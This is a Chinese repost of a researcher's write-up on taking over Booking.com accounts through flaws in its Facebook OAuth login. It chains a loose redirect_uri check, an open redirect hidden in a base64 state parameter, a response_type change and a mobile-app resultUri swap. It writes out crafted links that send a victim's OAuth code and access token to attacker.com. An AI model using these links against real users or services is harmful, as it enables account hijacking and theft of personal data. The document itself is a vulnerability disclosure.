# 原创
：  【OAuth漏洞】第三方身份验证-账号接管

# 【OAuth漏洞】第三方身份验证-账号接管

**目录**

[什么是OAuth？](#%E4%BB%80%E4%B9%88%E6%98%AFOAuth%EF%BC%9F)

[OAuth 如何用于身份验证？](#OAuth%20%E5%A6%82%E4%BD%95%E7%94%A8%E4%BA%8E%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%EF%BC%9F)

[在 Booking.com 实施 OAuth](#%E5%9C%A8%20Booking.com%20%E5%AE%9E%E6%96%BD%20OAuth)

[为什么 Booking.com](#%E4%B8%BA%E4%BB%80%E4%B9%88%20Booking.com)

[OAuth 在 Booking.com 中的工作原理](#OAuth%20%E5%9C%A8%20Booking.com%20%E4%B8%AD%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86)

[Booking.com 帐户接管](#Booking.com%20%E5%B8%90%E6%88%B7%E6%8E%A5%E7%AE%A1)

[安全漏洞 1 - 不允许唯一路径](#%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%201%20-%20%E4%B8%8D%E5%85%81%E8%AE%B8%E5%94%AF%E4%B8%80%E8%B7%AF%E5%BE%84)

[安全漏洞 2 - 开放重定向](#%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%202%20-%20%E5%BC%80%E6%94%BE%E9%87%8D%E5%AE%9A%E5%90%91)

[安全漏洞 1 + 2 = 帐户接管尝试](#%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%201%20%2B%202%20%3D%20%E5%B8%90%E6%88%B7%E6%8E%A5%E7%AE%A1%E5%B0%9D%E8%AF%95)

[更改响应类型](#%E6%9B%B4%E6%94%B9%E5%93%8D%E5%BA%94%E7%B1%BB%E5%9E%8B)

[流程摘要：](#%E6%B5%81%E7%A8%8B%E6%91%98%E8%A6%81%EF%BC%9A)

[帐户接管尝试 1](#%E5%B8%90%E6%88%B7%E6%8E%A5%E7%AE%A1%E5%B0%9D%E8%AF%95%201)

[调试帐户接管失败 – 我们错过了什么？](#%E8%B0%83%E8%AF%95%E5%B8%90%E6%88%B7%E6%8E%A5%E7%AE%A1%E5%A4%B1%E8%B4%A5%20%E2%80%93%20%E6%88%91%E4%BB%AC%E9%94%99%E8%BF%87%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F)

[寻找安全漏洞 3](#%E5%AF%BB%E6%89%BE%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%203)

---


本文作者：Aviad Carmel

笔者总结：

总结：

1、目标：第三方的身份验证

2、关注点：返回跳转到原网页的链接（可能会身份验证成功后的身份绑定）

3、利用：（1）将链接发送别人，当别人点击后，会绑定别人的账号；（2）URL重定向+身份验证链接

4、利用前提：未检验链接跳转来源、或者存在URL重定向漏洞

---


---


## **一、什么是OAuth？**

OAuth 2.0 是一种常用的框架，允许用户授权第三方应用程序访问其资源，而无需共享其密码。例如，您可以授权 Slack 访问您的 Google 日历，以便您的同事可以看到您何时参加会议。

OAuth最初并不是一个身份验证框架，但它已经成为一种广泛使用的身份验证机制，适用于具有社交登录功能的用户 - 您在网站和应用程序中看到的“使用Google / Facebook登录”选项。例如，许多电子商务网站和应用程序使用 OAuth 允许用户验证其帐户并进行购买，而无需多次输入凭据。

您可能听说过用于身份验证的“OpenID connect”——这是一个类似的概念，基于 OAuth。

OAuth 中的安全漏洞可能导致身份盗用、金融欺诈以及对各种个人信息（包括信用卡号、私人消息、健康记录等）的访问。去年，许多有趣的博客描述了登录OAuth流程中的帐户接管，例如[Frans Rosen的“Dirty Dance”](https://labs.detectify.com/2022/07/06/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/)和[Youssef Sammouda的博客](https://ysamm.com/?p=763)，调查结果使他获得了Facebook的44,625美元奖励。这些博客和其他博客提供了有关OAuth内部工作原理以及与之相关潜在风险的宝贵见解。

---


---


## **二、OAuth 如何用于身份验证？**

让我们从一个简单的非技术图开始：

让我们一一解释这些步骤：

1. 您输入 **Randomsite.com**，然后单击“使用Facebook登录”。

2. **Randomsite.com** 将打开Facebook的新窗口。

3. 如果这是您第一次**使用 Randomsite.com，Facebook** 会要求您给予许可。否则，Facebook 将自动对您进行身份验证。

4. 点击“继续以约翰身份”后，脸书将生成一个秘密令牌。此令牌对 **Randomsite.com** 是私有的，并与您的 Facebook 个人资料相关联。

5. Facebook使用此令牌将您重定向回 **Randomsite.com**。

6. **Randomsite.com** 使用该令牌直接与Facebook交谈以获取您的电子邮件地址。

7.Facebook批准这确实 **john@gmail.com，Randomsite.com** 可以登录他。

现在，让我们通过向图表添加 URL 来深入了解更多详细信息：

**在步骤 2-3 中：**

**约翰点击Facebook登录后，Randomsite.com** 会打开一个新窗口，指向以下地址：

**https://www.facebook.com/v3.0/dialog/oauth？******redirect_uri=https：//randomsite.com/OAuth******&amp;scope=email&amp;client_id=1501&amp;state=[random_value]&amp;response_type=token**.

请注意redirect_uri参数 - 它告诉Facebook在步骤4-5中将令牌发送到何处。

**在步骤 4-5 中：**

Facebook为 **Randomsite.com** 准备了一个秘密令牌（client_id参数告诉Facebook请求来自 randomsite.com），并将您的浏览器重定向回redirect_uri。确切的重定向：

**https://randomsite.com/OAuth#token=[secret_token]]&amp;state=[Random_Value]**

**在步骤 6-7 中：**

**Randomsite.com** 从URL读取令牌，并使用以下API使用它直接与Facebook通信：

**https://graph.facebook.com/me?fields=id,name,email&amp;access_token=[secret_token]。**

响应是 john@gmail.com。

示例中的流称为“隐式授权类型”，这在没有后端的单页应用程序和本机桌面应用程序中很常见。尽管我可以使用没有后端（没有 Randomsite.com）的示例，但我决定将隐式授权类型与后端结合使用，因为它更容易理解。

谷歌、苹果和其他知名供应商也遵循类似的流程。一种较新的方法利用了PostMessage功能而不是重定向，但我们在本文中没有讨论该用例。使用重定向仍然是最常见的方法。

---


---


## **三、 实施 OAuth**

###### **OAuth 在 Booking.com 中的工作原理**

该流程与具有 Randomsite.com 的示例非常相似，只是它包含一个新步骤，我们将其标记为红色：

步骤1： 在 **Booking.com** 中，您单击“使用Facebook登录”。

**步骤 2-3：**

预订将打开以下链接：**https://www.facebook.com/v3.0/dialog/oauth？******redirect_uri=https：//account.booking.com/social/result/facebook******&amp;scope=email&amp;client_id=210068525731476&amp;state=[large_object]&amp;******response_type=code****.

请注意，响应类型是代码，而不是我们在 Randomsite.com 示例中看到的令牌。

代码是应与令牌交换的临时值。它增加了一个额外的安全层，我将在步骤 6-7 中解释。

**步骤 4-5：**

Facebook 会验证您的身份，并使用**代码**将您重定向回 booking.com。

**https://account.booking.com/social/result/facebook?code={代码}&amp;状态=[large_object]**

请注意，代码 account.booking.com 是在查询参数 （**？**code=） 而不是像 Randomsite.com 示例那样的哈希片段 （**#**token=）。稍后我们将详细解释此问题。

**步骤 6-7：**

要获取令牌，booking.com 需要使用以下Facebook API将代码与令牌交换：

此步骤只能由 Booking.com 完成，因为它涉及只有 Booking.com 知道的 {应用机密}。该代码是一次性使用的 - 也就是说，它只能交换一次。这种方法更安全——如果攻击者窃取了代码，几乎不可能被利用。

**步骤 8-9：**

正如我们在 Randomsite.com 中看到的那样，Booking.com 使用Facebook API来获取有关您的信息，例如您的电子邮件地址。如果 Booking.com 有一个使用此电子邮件的帐户，则 Booking 会将您登录到此现有帐户。

此流在几乎每个新式站点中都很常见，称为“授权代码授予”或“OAuth 显式流”。

---


---


## **四、 帐户接管**

在OAuth中，攻击者的目标是窃取受害者的令牌或代码。在预订的情况下，重点是代码。我在OAuth研究中的一般方法是通过更改每个参数来引起流的意外行为，以了解这些操作如何推动我成功发起攻击的能力。

我能够将三个不同的安全问题链接在一起，我将详细解释这些问题，以便在 Booking.com 时实现完整的帐户接管。

###### **安全漏洞 1 - 不允许唯一路径**

通过操作此站点的OAuth序列中的一些步骤，我能够学习有用的信息并开始操作路径。

在正常行为中，就像我之前解释的那样，当用户点击“使用Facebook登录”时，Booking会将用户重定向到Facebook中的以下链接：**https://www.facebook.com/v3.0/dialog/oauth?redirect_uri=https://account.booking.com/ social/result/facebook&amp;scope=email&amp;client_id=210068525731476&amp;state=[large_object]&amp;response_type=code**。

在第 1 步中，我将redirect_uri更改为其他路径，并将此链接发送给受害者：

**https://www.facebook.com/v3.0/dialog/oauth?redirect_uri=https://account.booking.com/ any/path/an/attacker/wants&amp;scope=email&amp;client_id=210068525731476&amp;state=[large_object]&amp;response_type=code**.

请注意，我们无法更改原点 （**account.booking.com**），因为 Facebook 会抛出错误 - 它与 Booking.com 提供的预定义原产地不匹配。

当 Booking.com 注册到Facebook时，他们为redirect_uri提供了预定义的来源，但没有提供确切的路径。因此，Facebook只能在重定向发生之前验证源。

步骤4： 此链接会将受害者重定向到：

**https://account.booking.com/ any/path/an/attacker/wants？code=[secret_code]？state=[large_object]**

‍

我们可以将代码发送到我们想要的任何路径，所以现在我们寻找一种方法**将代码发送到我们**控制的另一个源/域。

###### **安全漏洞 2 - 开放重定向**

此时，我需要一条 booking.com 路径，将受害者重定向到我的受控域。这就是开放重定向漏洞的定义。

我开始探索 Booking.com 的功能，我在“我的仪表板”中发现了一件有趣的事情：

单击“添加显示名称”，指向以下 URL：

**https://account.booking.com/oauth2/authorize?aid=123;client_id=d1cDdLj40ACItEtxJLTo;redirect_uri=https://account.booking.com/settings/oauth_callback;response_type=code;state=******eyJteXNldHRpbmdzX3BhdGgiOiIvbXlzZXR0aW5ncy9wZXJzb25hbCIsImFpZCI6IjEyMyJ9****

该 URL 会自动将用户重定向到：**https://account.booking.com/mysettings/personal**。你能猜到怎么做吗？

我立即注意到****状态****变量包含一个base64 json字符串：**eyJteXNldHRpbmdzX3BhdGgiOiIvbXlzZXR0aW5ncy9wZXJzb25hbCIsImFpZCI6IjEyMyJ9**。

让我们解码一下：

似乎 Booking 使用mysettings_path来确定如何重定向用户。

让我们对以下 JSON 进行编码：

We got eyJteXNldHRpbmdzX3BhdGgiOiJodHRwczovL2F0dGFja2VyLmNvbS9pbmRleC5waHAiLCJhaWQiOiIxMjMifQ

我们替换原始链接中的状态，并向受害者发送新链接：

**https://account.booking.com/oauth2/authorize?aid=123;client_id=d1cDdLj40ACItEtxJLTo;redirect_uri=https://account.booking.com/settings/oauth_callback;response_type=code;state=eyJteXNldHRpbmdzX3BhdGgiOiJodHRwczovL2F0dGFja2VyLmNvbS9pbmRleC5waHAiLCJhaWQiOiIxMjMifQ**

该链接会自动将受害者重定向到较短的链接（我之前跳过了它）：

**https://account.booking.com/settings/oauth_callback?state=eyJteXNldHRpbmdzX3BhdGgiOiJodHRwczovL2F0dGFja2VyLmNvbS9pbmRleC5waHAiLCJhaWQiOiIxMjMifQ&amp;code=not_important_123**

然后到：

****https://attacker.com/index.php****

您可能已在打开重定向链接中看到“OAuth”或“redirect_uri”一词。我认为这是 OAuth 在 Booking.com 的内部实现。它与Facebook或安全漏洞1的redirect_uri无关。

**现在我们在 booking.com 中有一个开放的重定向错误。**

---


---


## **五、安全漏洞 1 + 2 = 帐户接管尝试**

从安全漏洞 1 到 Facebook 的链接（我们可以将代码发送到我们想要的任何路径）：

**https://www.facebook.com/v3.0/dialog/oauth?redirect_uri=https://account.booking.com/** ****any/path/we/want******&amp;scope=email&amp;client_id=210068525731476&amp;state=large_object]&amp;response_type=code**

**+**

来自安全缺口 2（重定向到 **www.attacker.com**）的开放重定向链接为：

****https://account.booking.com/oauth2/authorize?aid=123;client_id=d1cDdLj40ACItEtxJLTo;redirect_uri=https://account.booking.com/settings/oauth_callback;response_type=code;state=eyJteXNldHRpbmdzX3BhdGgiOiJodHRwczovL2F0dGFja2VyLmNvbS9pbmRleC5waHAiLCJhaWQiOiIxMjMifQ****

**=**

让我们在安全漏洞 1 的redirect_uri中插入打开的重定向链接：

**https://www.facebook.com/v3.0/dialog/oauth?redirect_uri=******https://account.booking.com/oauth2/authorize?aid=123;client_id=d1cDdLj40ACItEtxJLTo;redirect_uri=https://account.booking.com/settings/oauth_callback;response_type=code;state=eyJteXNldHRpbmdzX3BhdGgiOiJodHRwczovL2F0dGFja2VyLmNvbS9pbmRleC5waHAiLCJhaWQiOiIxMjMifQ******&amp;范围=电子邮件&amp;response_type=代码&amp;client_id=210068525731476**

我们将此链接发送给受害者。

###### **更改响应类型**

如果受害者点击链接，Facebook 会将用户重定向到安全漏洞 2 中的 URL，并带有代码：

**https://account.booking.com/oauth2/authorize?aid=123;client_id=d1cDdLj40ACItEtxJLTo;redirect_uri=https://account.booking.com/settings/oauth_callback;response_type=code;state=eyJteXNldHRpbmdzX3BhdGgiOiJodHRwczovL2F0dGFja2VyLmNvbS9pbmRleC5waHAiLCJhaWQiOiIxMjMifQ&amp;代码=[secret_code]**

它是具有开放重定向的 URL（状态 eyJteXN...指向 attacker.com），因此 Booking 将受害者重定向到：**https://attacker.com/index.php**。

**但是，在重定向中，浏览器仅传递“#”（哈希片段）之后的值。**在查询参数 （？=code=） 中传递的代码未发送到 attacker.com（未显示在重定向到 https://attacker.com/index.php 中）。

通过将响应类型从“代码”更改为“代码，令牌”。Facebook将在**哈希片段**中同时发送代码和令牌。这是一个功能:)

原因是：由于访问令牌是 OAuth 中的超级敏感值，因此使用哈希片段是一种更安全的方法。它不会发送到服务器端，也不会出现在日志中——只有 javascript 代码可以读取它。（有关此详细信息的更多信息，您可以在Google上搜索“OAuth隐式授权”。

##### **流程摘要：**

步骤1：攻击者向受害者发送以下链接：

**https://www.facebook.com/v3.0/dialog/oauth?redirect_uri=https://account.booking.com/oauth2/authorize?aid=123;client_id=d1cDdLj40ACItEtxJLTo;redirect_uri=https://account.booking.com/settings/oauth_callback;response_type=code;state=eyJteXNldHRpbmdzX3BhdGgiOiJodHRwczovL2F0dGFja2VyLmNvbS9pbmRleC5waHAiLCJhaWQiOiIxMjMifQ&amp;scope=email&amp;response_type=代码，令牌&amp;client_id=210068525731476**

第 2 步和第 3 步：受害者点击新链接（响应类型=代码，令牌）后，Facebook **会自动**将用户从安全漏洞 2 重定向到 URL，并在**哈希片段**中带有代码：

**https://account.booking.com/oauth2/authorize?aid=123;client_id=d1cDdLj40ACItEtxJLTo;redirect_uri=https://account.booking.com/settings/oauth_callback;response_type=code;state=eyJteXNldHRpbmdzX3BhdGgiOiJodHRwczovL2F0dGFja2VyLmNvbS9pbmRleC5waHAiLCJhaWQiOiIxMjMifQ #code=[secret_code]&amp;access_token=[令牌]**

第 4 步和第 5 步：这是具有开放重定向的 URL（状态指向 attacker.com），因此 Booking 会将受害者重定向到：**https://attacker.com/index.php**

第 6 步：浏览器将代码添加到哈希片段中，并将受害者重定向到：

**https://attacker.com/index.php #code=[secret_code]&amp;access_token=[令牌]**

**可选：让我们看看 attacker.com/index.php 的源代码：**

**索引.php** - 读取 url 并将其发送到保存.php的 JavaScript 代码。

**保存.php **- 将输入保存到日志文件。

（我用 sanppify.com 生成了代码）

##### **帐户接管尝试 1**

在这一点上，我们有受害者的代码。我们（作为攻击者）需要启动一个新的登录流程，并将我们的代码替换为受害者代码。我们再次单击“使用 Facebook 登录”并使用我们的帐户登录。

在正常流程中，在Facebook对我们进行身份验证后，它会使用我们的代码将我们重定向到预订：

**https://account.booking.com/social/result/facebook?code={our_code}&amp;state=[large_object]**

**我们拦截此请求。 **我们将代码替换为受害者被盗的代码：

**https://account.booking.com/social/result/facebook?code={victim_code}&amp;state=[large_object]**

Booking.com 应该将代码交换为令牌，并获取受害者的个人资料信息。

什么回来了？等着...

“无效代码”

什么也没发生。我错过了什么？

##### **调试帐户接管失败 – 我们错过了什么？**

从 Facebook 文档中，要与令牌交换代码，后端的 Booking.com 应该使用此 API：

**在文档中，Facebook写道：“此参数（redirect_uri）必须与您 ****启动OAuth登录过程时使用**的****原始****参数相同”。

我们从这个链接开始了OAuth登录过程：

**https://www.facebook.com/v3.0/dialog/oauth?redirect_uri=https://account.booking.com/oauth2/authorize?aid=123;client_id=d1cDdLj40ACItEtxJLTo;redirect_uri=https://account.booking.com/settings/oauth_callback;response_type=code;state=******eyJteXNldHRpbmdzX3BhdGgiOiJodHRwczovL2F0dGFja2VyLmNvbS9pbmRleC5waHAiLCJhaWQiOiIxMjMifQ****&amp;**scope=email&amp;response_type=token，code&amp;client_id=210068525731476**

在这种情况下，**原始**redirect_uri标记为紫色。此链接是来自安全漏洞 2 的开放重定向链接。

但是，在后端，当Booking使用/**oauth/access_token** API交换令牌的代码时，它会向Facebook发送硬编码值“**https://account.booking.com/social/result/facebook**”作为redirect_uri。这是预订在正常流程中使用的redirect_uri。

在同一个OAuth流程中，Facebook得到了两个不同的redirect_uri，变得可疑，因此抛出了一个错误。

##### **寻找安全漏洞 3**

在这一点上，我无法在网上找到解决方案，所以我决定对 Booking.com 的移动应用程序做一些研究。我使用Android studio，Frida（绕过SSL固定）和反编译器来读取该应用程序上负责OAuth的代码。

为了拦截移动应用程序和后端之间的请求 Booking.com 我使用了 Burp。

移动应用程序上的交易所图有点令人困惑——您可以只关注第 6 步：

移动应用程序中的 OAuth 流与网站上的流有一个主要区别 - 步骤 6。

步骤 3 到 6：将代码传递给移动应用程序，然后移动应用程序将其发送到 Booking.com。为了更准确地说，代码被传递给Chrome-&gt;Booking.com-&gt;MobileApp-&gt;Booking.com

我不知道为什么这个乒乓球是必要的。

第 6 步：移动应用程序使用 post 请求将代码传递给 Booking.com：

**注意结果 Uri。你能猜出预订是用它做什么的吗？**

如果 Booking.com 使用 resultURi 作为与 token 交换代码redirect_uri，并且我们可以控制这个值，那么我们可以绕过 Facebook 的验证。

我们用于攻击的原始redirect_uri是：

**https://account.booking.com/oauth2/authorize?aid=123;client_id=d1cDdLj40ACItEtxJLTo;redirect_uri=https://account.booking.com/settings/oauth_callback;response_type=code;state=******eyJteXNldHRpbmdzX3BhdGgiOiJodHRwczovL2F0dGFja2VyLmNvbS9pbmRleC5waHAiLCJhaWQiOiIxMjMifQ****

总而言之，作为攻击者，我们需要：
1. 使用攻击者帐户从攻击者移动应用程序登录到 Booking.com。1. 在步骤 6 中截获请求。1. 将我们的代码替换为被盗的受害者代码。1. 将 resultURi 替换为我们用于攻击的链接 （booking.com/state=eyJteXn..）
我们将该请求发送给 Booking.com，然后...**游戏结束。我们可以登录受害者帐户。**
